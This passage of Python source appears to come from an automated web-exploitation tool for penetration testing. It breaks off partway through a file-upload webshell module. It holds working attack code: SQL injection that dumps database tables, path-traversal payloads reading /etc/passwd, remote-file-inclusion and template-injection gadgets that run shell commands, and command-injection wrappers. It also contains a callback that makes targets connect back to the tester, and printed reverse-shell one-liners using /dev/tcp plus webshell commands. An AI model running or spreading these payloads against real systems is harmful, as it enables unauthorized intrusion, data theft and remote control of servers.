                    return s or None
                return _harvest("boolean", cname, None, None, bx, scalars_only=True)
        return None

    def _harvest(technique, cname, cols, refl, xf, scalars_only=False):
        info = {"technique": technique, "ctx": cname, "cols": cols, "refl": refl, "rows": []}
        info["version"] = xf("@@version")
        info["user"] = xf("current_user()")
        info["db"] = xf("database()")
        if scalars_only:
            return info
        tbls = xf("(SELECT group_concat(table_name SEPARATOR 0x2c) FROM "
                  "information_schema.tables WHERE table_schema=database())")
        tables = [t for t in (tbls or "").split(",") if t][:40]
        info["tables"] = tables
        pick = [t for t in tables if _SQLI_INTERESTING_TBL.search(t)] or tables
        for tname in pick[:_SQLI_DUMP_TABLES]:
            if time.time() >= deadline:
                break
            cnames = xf("(SELECT group_concat(column_name SEPARATOR 0x2c) FROM "
                        f"information_schema.columns WHERE table_schema=database() AND table_name={_hx(tname)})")
            columns = [c for c in (cnames or "").split(",") if c]
            if not columns:
                continue
            want = [c for c in columns if _SQLI_INTERESTING_COL.search(c)] or columns[:3]
            want = want[:4]
            expr = ("(SELECT group_concat(concat_ws(0x7c," + ",".join(want) +
                    f") SEPARATOR 0x0a) FROM {tname} LIMIT {_SQLI_DUMP_ROWS})")
            rows = xf(expr)
            info["rows"].append((tname, want, [r for r in (rows or "").split("\n") if r]))
        return info

    targets = _gather_sqli_targets(ip, port, proto)[:_SQLI_DUMP_MAX_TARGETS]
    if _get(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot dump")

    results = {}
    for hostval, path, param in targets:
        if time.time() >= deadline:
            break
        info = _engine(hostval, path, param)
        if info:
            results.setdefault(hostval, []).append((path, param, info))

    lines = [f"{scheme}://{ip}:{port}/ SQLi auto-dump (OSCP-safe, no sqlmap)",
             f"targets: {len(targets)} · extracted {sum(len(v) for v in results.values())} · "
             f"{'deadline' if time.time() >= deadline else 'complete'}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, info in results[hostval]:
                tag = info["technique"] + (f", {info['cols']} cols, col#{info['refl'] + 1}"
                                           if info["cols"] else "")
                lines.append(f"  ✗ {path}?{param}  ({tag})")
                if info.get("version"):
                    lines.append(f"      version: {info['version']}")
                idl = " · ".join(x for x in (f"user: {info['user']}" if info.get("user") else "",
                                             f"db: {info['db']}" if info.get("db") else "") if x)
                if idl:
                    lines.append(f"      {idl}")
                if info.get("tables"):
                    lines.append(f"      tables: {', '.join(info['tables'][:15])}")
                for tname, cols_, rows in info.get("rows", []):
                    lines.append(f"      {tname} ({','.join(cols_)}):")
                    lines += [f"        {r}" for r in rows[:_SQLI_DUMP_ROWS]]
    else:
        lines.append("\nno SQL injection extracted")
    return "\n".join(lines)


# LFI / path traversal — file-like param names, read-only payloads, content-verified.
_LFI_FILE_PARAM = re.compile(
    r"file|page|path|include|inc|template|tpl|doc|document|view|lang|dir|load|read|"
    r"download|content|src|url|cat", re.I)
_LFI_PASSWD = ["/etc/passwd"] + ["../" * d + "etc/passwd" for d in range(1, 9)] + [
    "....//" * 6 + "etc/passwd",
    "..%2f" * 6 + "etc%2fpasswd",
    "..%252f" * 6 + "etc%252fpasswd",
    "/etc/passwd%00", "../" * 6 + "etc/passwd%00",
    "php://filter/resource=/etc/passwd",
]
_LFI_WIN = ["..\\" * 6 + "windows\\win.ini", "..%5c" * 6 + "windows%5cwin.ini",
            "C:\\windows\\win.ini"]
_LFI_ENVIRON = ["/proc/self/environ", "../" * 6 + "proc/self/environ"]
_LFI_PHPSRC = ["php://filter/convert.base64-encode/resource=index.php",
               "php://filter/read=convert.base64-encode/resource=index.php",
               "php://filter/convert.base64-encode/resource=index"]
_LFI_SIG_PASSWD = re.compile(r"^[a-zA-Z_][\w.-]*:[^:\n]*:\d+:\d+:", re.M)
_LFI_SIG_WIN = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
_LFI_SIG_ENVIRON = re.compile(r"PATH=|HTTP_HOST=|DOCUMENT_ROOT=|SERVER_SOFTWARE=")
_LFI_DEADLINE = 180
_LFI_THREADS = 8
_LFI_MAX_PARAMS = 20


def _gather_lfi_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path, param) with file-like params first (LFI most likely there)."""
    ts = _gather_sqli_targets(ip, port, proto)
    ts.sort(key=lambda t: 0 if _LFI_FILE_PARAM.search(t[2]) else 1)
    return ts[:_LFI_MAX_PARAMS]


def _tool_lfi_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: LFI / path traversal on file-like params (host + vhosts). Read-only
    payloads (traversal depths, URL/double-encoding, php:// wrappers, /proc, Windows); each
    hit is CONFIRMED by file-content signature (passwd line / win.ini / environ / base64→<?php)
    so a soft-error page can't cause a false positive. Auto-reads source via php://filter and
    harvests usernames from /etc/passwd; RCE (log poisoning etc.) is printed as a command,
    not run. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import base64
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path, param, payload):
        conn = None
        q = f"{path}?{param}={payload}"                       # payloads are pre-encoded — send raw
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=8)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(200000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test LFI")

    targets = _gather_lfi_targets(ip, port, proto)
    results = {}
    lock = threading.Lock()

    def _b64_php(body):
        for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", body or ""):
            try:
                dec = base64.b64decode(blob).decode("utf-8", "replace")
            except Exception:                                 # noqa: BLE001
                continue
            if "<?php" in dec or "<?=" in dec:
                return dec
        return None

    def _test(hostval, path, param):
        found = []
        # 1) /etc/passwd via traversal / wrappers
        for pl in _LFI_PASSWD:
            _st, body = _probe(hostval, path, param, pl)
            if body and _LFI_SIG_PASSWD.search(body):
                users = re.findall(r"^([a-zA-Z_][\w.-]*):[^:\n]*:\d+", body, re.M)
                found.append(("passwd", pl, users[:12]))
                break
        # 2) Windows win.ini
        for pl in _LFI_WIN:
            _st, body = _probe(hostval, path, param, pl)
            if body and _LFI_SIG_WIN.search(body):
                found.append(("win.ini", pl, []))
                break
        # 3) /proc/self/environ (RCE vector via UA poisoning)
        for pl in _LFI_ENVIRON:
            _st, body = _probe(hostval, path, param, pl)
            if body and _LFI_SIG_ENVIRON.search(body):
                found.append(("environ", pl, []))
                break
        # 4) php://filter source disclosure (auto-read, safe enumeration)
        for pl in _LFI_PHPSRC:
            _st, body = _probe(hostval, path, param, pl)
            src = _b64_php(body)
            if src:
                found.append(("php-src", pl, [src[:120].replace("\n", " ")]))
                break
        if found:
            with lock:
                results.setdefault(hostval, []).append((path, param, found))

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_LFI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    lines = [f"{scheme}://{ip}:{port}/ LFI / path traversal scan",
             f"params tested: {len(targets)} · "
             f"injectable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, found in results[hostval]:
                kinds = ", ".join(k for k, _p, _x in found)
                lines.append(f"  ✗ LFI {path}?{param}  ({kinds})")
                for kind, pl, extra in found:
                    if kind == "passwd":
                        lines.append(f"      /etc/passwd via {pl}")
                        if extra:
                            lines.append(f"      users: {', '.join(extra)}")
                    elif kind == "win.ini":
                        lines.append(f"      windows read via {pl}")
                    elif kind == "environ":
                        lines.append(f"      /proc/self/environ readable via {pl}")
                    elif kind == "php-src":
                        lines.append(f"      php://filter source readable ({pl})")
                        if extra:
                            lines.append(f"        {extra[0]}")
                url = f"{scheme}://{ip}:{port}{path}?{param}="
                lines.append(f"      RCE (manual): curl '{url}/var/log/apache2/access.log' "
                             f"-A '<?php system($_GET[0]);?>' ; then {url}/var/log/apache2/access.log&0=id")
    else:
        lines.append("\nno LFI / path traversal found")
    return "\n".join(lines)


_RFI_DEADLINE = 120
_RFI_THREADS = 8
_RFI_MAX_PARAMS = 20


def _tool_rfi_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: RFI / wrapper inclusion on file-like params (host + vhosts). Instead of
    hammering remote http (needs your server), it confirms inclusion/execution locally with a
    unique marker via data:// (plain + base64), php://input and expect://. A marker echoed
    WITHOUT the raw <?php text = code executed (allow_url_include on → RCE-capable); marker with
    raw code = wrapper included as text only. Non-destructive (echo marker); remote webshell is a
    printed command, not run. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import base64
    import random
    import string
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    marker = "pshRFI" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    php = f"<?php echo '{marker}'; ?>"
    b64 = base64.b64encode(php.encode()).decode()
    # each: (label, method, payload, reflect-literal) — the literal is what a plain reflection
    # of the payload would put around the marker; if it's in the body the marker was only
    # echoed back as TEXT (not executed). base64 hides the marker, so its plaintext = exec.
    payloads = [
        ("data://", "GET", f"data://text/plain,{php}", f"echo '{marker}'"),
        ("data://base64", "GET", f"data://text/plain;base64,{b64}", None),
        ("php://input", "POST", php, f"echo '{marker}'"),
        ("expect://", "GET", f"expect://echo {marker}", f"echo {marker}"),
    ]

    def _req(hostval, method, path, param, value, body=None):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=8)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if body is not None:
                hdr["Content-Type"] = "text/plain"
            conn.request(method, q, body=body, headers=hdr)
            resp = conn.getresponse()
            return resp.status, resp.read(100000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test RFI")

    targets = _gather_lfi_targets(ip, port, proto)[:_RFI_MAX_PARAMS]
    results = {}
    lock = threading.Lock()

    def _classify(body, lit):
        if not body or marker not in body:
            return None
        if "<?php" in body or (lit and lit in body):         # payload echoed back verbatim
            return "include"                                 # included/reflected as text, not run
        return "exec"

    def _test(hostval, path, param):
        # only EXEC is reliable RFI evidence — plain reflection of a data:// payload is just
        # reflection (XSS), not inclusion, so we don't report a text-only "include" verdict.
        for kind, method, data, lit in payloads:
            if method == "POST":
                r = _req(hostval, "POST", path, param, "php://input", body=data)
            else:
                r = _req(hostval, "GET", path, param, data)
            if _classify(r[1], lit) == "exec":
                # RCE confirmed → verify egress so the reverse-shell info is checked, not guessed
                def _run(c, _h=hostval, _p=path, _pa=param):
                    self_payload = f"data://text/plain,<?php system('{c}'); ?>"
                    _req(_h, "GET", _p, _pa, self_payload)
                cb = _verify_rce_callback(ip, _run)
                with lock:
                    results.setdefault(hostval, []).append((path, param, "exec", kind, cb))
                return

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_RFI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    lines = [f"{scheme}://{ip}:{port}/ RFI / wrapper inclusion scan",
             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, _verdict, via, cb in results[hostval]:
                lines.append(f"  ✗ RFI {path}?{param}  ({via} exec — RCE-capable; allow_url_include ON)")
                url = f"{scheme}://{ip}:{port}{path}?{param}="
                ok, addr = cb if cb else (False, None)
                if ok:
                    myip = addr.split(":")[0]
                    lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
                    rev = f"data://text/plain,<?php system('bash -c \"bash -i >%26 /dev/tcp/{myip}/4444 0>%261\"'); ?>"
                    lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}): "
                                 f"{url}{urllib.parse.quote(rev, safe='')}")
                else:
                    lines.append(f"      egress NOT confirmed (code-exec proven) — remote webshell: "
                                 f"{url}http://<YOUR_IP>/shell.txt # shell.txt = <?php system($_GET[0]);?>")
    else:
        lines.append("\nno RFI / wrapper inclusion found")
    return "\n".join(lines)


# OS command injection — params that often reach a shell, tested first.
_CMDI_SUSPECT = re.compile(
    r"host|ip|ping|cmd|exec|dns|domain|url|file|name|query|target|addr|command|run|"
    r"search|lookup|nslookup|trace|port", re.I)
_CMDI_DEADLINE = 240
_CMDI_THREADS = 6
_CMDI_REQ_TIMEOUT = 10
_CMDI_TIME_DELAY = 5
_CMDI_MAX_PARAMS = 20
_CMDI_MAX_TIME_PARAMS = 10


def _gather_cmdi_targets(ip: str, port: int, proto: str) -> list:
    ts = _gather_sqli_targets(ip, port, proto)
    ts.sort(key=lambda t: 0 if _CMDI_SUSPECT.search(t[2]) else 1)
    return ts[:_CMDI_MAX_PARAMS]


def _verify_rce_callback(target_ip: str, run_cmd, timeout: int = 8) -> "tuple":
    """Prove a confirmed RCE can reach us back (so a reverse shell will work) WITHOUT giving a
    shell: open a short-lived listener, have the target hit it via run_cmd (a closure that runs
    a shell command through the vector), wait for the marked connection, tear it down. Returns
    (ok, "ip:port"). ip is our address the target actually routed to."""
    import socket
    import threading
    import random
    import string
    try:                                                     # our source IP toward the target
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.connect((target_ip, 9))
        myip = u.getsockname()[0]
        u.close()
    except Exception:                                        # noqa: BLE001
        return False, None
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
    except Exception:                                        # noqa: BLE001
        return False, None
    cbport = srv.getsockname()[1]
    marker = "pshCB" + "".join(random.choices(string.ascii_lowercase, k=6))
    got = {"ok": False}

    def _accept():
        try:
            conn, _ = srv.accept()
            data = conn.recv(2048)
            if marker.encode() in data:
                got["ok"] = True
            try:                                             # reply so the target's curl/wget returns
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            except Exception:                                # noqa: BLE001
                pass
            conn.close()
        except Exception:                                    # noqa: BLE001
            pass

    th = threading.Thread(target=_accept, daemon=True)
    th.start()
    url = f"http://{myip}:{cbport}/{marker}"
    for c in (f"curl -s {url}", f"wget -qO- {url}",
              f"python3 -c \"import urllib.request as u;u.urlopen('{url}')\"",
              f"exec 3<>/dev/tcp/{myip}/{cbport}; echo -e 'GET /{marker} HTTP/1.0\\r\\n\\r\\n' >&3"):
        try:
            run_cmd(c)
        except Exception:                                    # noqa: BLE001
            pass
        th.join(timeout=max(2, timeout // 3))
        if got["ok"]:
            break
    try:
        srv.close()
    except Exception:                                        # noqa: BLE001
        pass
    return got["ok"], f"{myip}:{cbport}"


# command-injection separators, shared by cmdi-scan (detection) and foothold (which rebuilds
# the exact wrapper from the label cmdi-scan recorded in the DB). CMD is spliced into the value.
_CMDI_WRAPS = [
    ("; ", lambda c: f"1;{c}"),
    ("| ", lambda c: f"1|{c}"),
    ("&& ", lambda c: f"1&&{c}"),
    ("$(...)", lambda c: f"1$({c})"),
    ("`...`", lambda c: f"1`{c}`"),
    ("newline", lambda c: f"1\n{c}"),
]
_CMDI_TIME_WRAPS = [
    ("; sleep", lambda n: f"1;sleep {n}"),
    ("| sleep", lambda n: f"1|sleep {n}"),
    ("&& sleep", lambda n: f"1&&sleep {n}"),
    ("$(sleep)", lambda n: f"1$(sleep {n})"),
    ("`sleep`", lambda n: f"1`sleep {n}`"),
    ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
]


def _tool_cmdi_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: OS command injection on params (host + vhosts). Output-based uses a
    COMPUTED marker (echo pshOS$((a+b))) so only real shell arithmetic — not a reflected
    payload — counts (near-zero FP); time-based (sleep / ping) with a control + confirm catches
    the blind case. On an output-based hit it auto-runs read-only id / whoami / uname / hostname
    to prove RCE and show privilege. Reverse shell is a printed command, not run. Stdlib only."""
    import http.client
    import ssl
    import time
    import random
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    deadline = time.time() + _CMDI_DEADLINE

    wraps = _CMDI_WRAPS
    time_wraps = _CMDI_TIME_WRAPS

    def _get(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        t0 = time.perf_counter()
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_CMDI_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_CMDI_REQ_TIMEOUT)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(100000).decode("utf-8", "replace"), time.perf_counter() - t0
        except Exception:                                     # noqa: BLE001
            return None, None, time.perf_counter() - t0
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _get(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test cmd injection")

    targets = _gather_cmdi_targets(ip, port, proto)
    results = {}
    lock = threading.Lock()
    time_pool = []

    def _test_output(hostval, path, param):
        a, b = random.randint(1000, 9000), random.randint(1000, 9000)
        token = f"pshOS{a + b}zz"
        cmd = f"echo pshOS$(({a}+{b}))zz"
        for label, wrap in wraps:
            if time.time() >= deadline:
                return None
            _st, body, _el = _get(hostval, path, param, wrap(cmd))
            if body and token in body:                        # computed → shell ran it
                return (label, wrap)
        return None

    def _run(hostval, path, param, wrap, cmd):
        dm = "pshE" + "".join(random.choices("abcdef0123456789", k=6))
        _st, body, _el = _get(hostval, path, param, wrap(f"echo {dm}$({cmd}){dm}"))
        m = re.search(re.escape(dm) + r"(.*?)" + re.escape(dm), body or "", re.S)
        return " ".join(m.group(1).split())[:120] if m else None

    def _test_time(hostval, path, param):
        lat = min(_get(hostval, path, param, "1")[2], _get(hostval, path, param, "1")[2])
        for label, tpl in time_wraps:
            if time.time() >= deadline:
                return None
            c_el = _get(hostval, path, param, tpl(0))[2]
            t_el = _get(hostval, path, param, tpl(_CMDI_TIME_DELAY))[2]
            if t_el >= _CMDI_TIME_DELAY * 0.7 and (t_el - max(lat, c_el)) >= _CMDI_TIME_DELAY * 0.6:
                t2 = _get(hostval, path, param, tpl(_CMDI_TIME_DELAY))[2]
                if t2 >= _CMDI_TIME_DELAY * 0.7:
                    return label
        return None

    def _test(hostval, path, param):
        hit = _test_output(hostval, path, param)
        if hit:
            label, wrap = hit
            enum = [(n, _run(hostval, path, param, wrap, c))
                    for n, c in (("id", "id"), ("whoami", "whoami"),
                                 ("uname", "uname -a"), ("host", "hostname"))]
            # verify egress through the CONFIRMED separator only (one callback, not all six)
            cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, wrap(c)))
            with lock:
                results.setdefault(hostval, []).append((path, param, "echo", label, enum, cb))
            return
        with lock:
            time_pool.append((hostval, path, param))          # try time-based later (sequential)

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_CMDI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    for hostval, path, param in time_pool[:_CMDI_MAX_TIME_PARAMS]:   # timing-sensitive → sequential
        if time.time() >= deadline:
            break
        lbl = _test_time(hostval, path, param)
        if lbl:                                               # blind: run commands via the ';' separator
            cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, wraps[0][1](c)))
            results.setdefault(hostval, []).append((path, param, "time", lbl, None, cb))

    lines = [f"{scheme}://{ip}:{port}/ OS command injection scan",
             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, kind, label, enum, cb in results[hostval]:
                lines.append(f"  ✗ CMDI {path}?{param}  ({kind}-based, {label})")
                if enum:
                    for n, val in enum:
                        if val:
                            lines.append(f"      {n}: {val}")
                else:
                    lines.append("      blind (no output reflected)")
                ok, addr = cb if cb else (False, None)
                if ok:
                    myip = addr.split(":")[0]
                    lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
                    lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}, then run): "
                                 f"1;bash -c 'bash -i >& /dev/tcp/{myip}/4444 0>&1'")
                else:
                    lines.append("      egress NOT confirmed (RCE proven above; outbound may be firewalled) — "
                                 "reverse shell: 1;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'")
    else:
        lines.append("\nno OS command injection found")
    return "\n".join(lines)


# SSTI: template syntaxes for the math probe, then per-family RCE gadgets (run a command).
_SSTI_SYNTAX = [
    ("{{ }}", lambda e: "{{" + e + "}}"),
    ("${ }", lambda e: "${" + e + "}"),
    ("#{ }", lambda e: "#{" + e + "}"),
    ("<%= %>", lambda e: "<%= " + e + " %>"),
    ("{ }", lambda e: "{" + e + "}"),
    ("@( )", lambda e: "@(" + e + ")"),
]
# family -> [(engine, gadget(cmd) -> payload)] — gadgets run a shell command via the engine
_SSTI_GADGETS = {
    "{{ }}": [
        ("Jinja2", lambda c: "{{cycler.__init__.__globals__.os.popen('" + c + "').read()}}"),
        ("Jinja2", lambda c: "{{lipsum.__globals__.os.popen('" + c + "').read()}}"),
        ("Twig", lambda c: "{{['" + c + "']|filter('system')}}"),
        ("Nunjucks", lambda c: "{{range.constructor(\"return global.process.mainModule."
                               "require('child_process').execSync('" + c + "')\")()}}"),
    ],
    "${ }": [
        ("Freemarker", lambda c: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + c + '")}'),
        ("Mako", lambda c: "${__import__('os').popen('" + c + "').read()}"),
        ("Smarty", lambda c: "${system('" + c + "')}"),
    ],
    "<%= %>": [
        ("ERB", lambda c: "<%= `" + c + "` %>"),
        ("ERB", lambda c: "<%= IO.popen('" + c + "').read %>"),
    ],
    "{ }": [
        ("Smarty", lambda c: "{system('" + c + "')}"),
        ("Smarty", lambda c: "{php}system('" + c + "');{/php}"),
    ],
}
_SSTI_DEADLINE = 150
_SSTI_THREADS = 8
_SSTI_MAX_PARAMS = 20


def _tool_ssti_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: server-side template injection. A COMPUTED math marker ({{a*b}} etc.)
    across template syntaxes confirms evaluation (not reflection) with near-zero FP; then, for
    the matching syntax family, engine RCE gadgets run a read-only `id` — a `uid=` in the reply
    confirms RCE and identifies the engine. The findings carry a confirmed command-execution
    one-liner (swap `id` for anything). Only a reverse shell needs your listener. Stdlib only."""
    import http.client
    import ssl
    import time
    import random
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    deadline = time.time() + _SSTI_DEADLINE

    def _get(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=8)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(100000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _get(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test SSTI")

    targets = _gather_sqli_targets(ip, port, proto)[:_SSTI_MAX_PARAMS]
    results = {}
    lock = threading.Lock()

    def _test(hostval, path, param):
        a, b = random.randint(100, 999), random.randint(100, 999)
        prod, expr = str(a * b), f"{a}*{b}"
        family = None
        for fam, mk in _SSTI_SYNTAX:
            if time.time() >= deadline:
                return
            _st, body = _get(hostval, path, param, mk(expr))
            if body and prod in body and expr not in body:    # computed → template evaluated
                family = fam
                break
        if not family:
            return
        engine, idout, run_gadget, cb = None, None, None, None
        for eng, gad in _SSTI_GADGETS.get(family, []):
            if time.time() >= deadline:
                break
            _st, body = _get(hostval, path, param, gad("id"))
            m = re.search(r"uid=\d+\([^)]*\)[^\n<]*", body or "")
            if m:
                engine, idout, run_gadget = eng, m.group(0).strip(), gad
                cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, run_gadget(c)))
                break
        with lock:
            results.setdefault(hostval, []).append((path, param, family, engine, idout, run_gadget, cb))

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_SSTI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    lines = [f"{scheme}://{ip}:{port}/ SSTI (server-side template injection) scan",
             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, family, engine, idout, gad, cb in results[hostval]:
                url = f"{scheme}://{ip}:{port}{path}?{param}="
                if engine and gad:
                    lines.append(f"  ✗ SSTI {path}?{param}  ({family} → {engine}, RCE confirmed)")
                    lines.append(f"      id: {idout}")
                    cmd_payload = urllib.parse.quote(gad("$CMD"), safe="")
                    lines.append(f"      run any cmd: curl '{url}{cmd_payload}'  "
                                 f"# replace $CMD with your command (confirmed via id above)")
                    ok, addr = cb if cb else (False, None)
                    if ok:
                        myip = addr.split(":")[0]
                        rev = gad(f"bash -c 'bash -i >& /dev/tcp/{myip}/4444 0>&1'")
                        lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
                        lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}): "
                                     f"curl '{url}{urllib.parse.quote(rev, safe='')}'")
                    else:
                        rev = gad("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'")
                        lines.append(f"      egress NOT confirmed (RCE proven above) — reverse shell: "
                                     f"curl '{url}{urllib.parse.quote(rev, safe='')}' # set YOUR_IP + nc -lvnp 4444")
                else:
                    lines.append(f"  ⚠ SSTI {path}?{param}  ({family} evaluated — engine RCE gadget "
                                 f"not auto-confirmed; try engine-specific payloads)")
    else:
        lines.append("\nno SSTI found")
    return "\n".join(lines)


# ── HTTP step 21: file-upload → webshell (PHP only; exec-verified, non-destructive) ──
_UPLOAD_DEADLINE = 300          # s — hard wall-clock cap over all forms/variants
_UPLOAD_REQ_TIMEOUT = 10
_UPLOAD_MAX_FORMS = 12          # distinct upload surfaces to probe
_UPLOAD_PATH_RE = re.compile(
    r"upload|avatar|profile|import|attach|media|photo|gallery|file", re.I)
# common upload endpoints to try when nothing was mined by earlier steps (per host + vhost)
_UPLOAD_FALLBACK_PATHS = [
    "/upload", "/upload.php", "/uploads", "/admin/upload", "/admin/upload.php",
    "/profile", "/profile.php", "/account", "/avatar", "/avatar.php",
    "/import", "/import.php", "/file", "/files", "/attachment", "/attachments",
    "/media", "/gallery", "/photo", "/settings",
]
# where a stored file is commonly reachable from, checked when the response doesn't leak a URL
_UPLOAD_STORE_DIRS = [
    "/uploads/", "/upload/", "/files/", "/file/", "/images/", "/img/", "/media/",
    "/avatars/", "/avatar/", "/attachments/", "/userfiles/", "/data/", "/assets/",
    "/content/", "/tmp/", "/",
]


def _parse_upload_form(html: str, page_path: str) -> "dict | None":
    """Pull a multipart upload <form> (the one with a file input): its action, method, the
    file field name, and the other fields (hidden CSRF tokens + required text) to echo back."""
    for form in re.findall(r"<form[^>]*>.*?</form>", html or "", re.I | re.S):
        if not re.search(r"type=[\"']?file", form, re.I):
            continue
        fm = re.search(r"<form[^>]*>", form, re.I)
        fmt = fm.group(0) if fm else ""
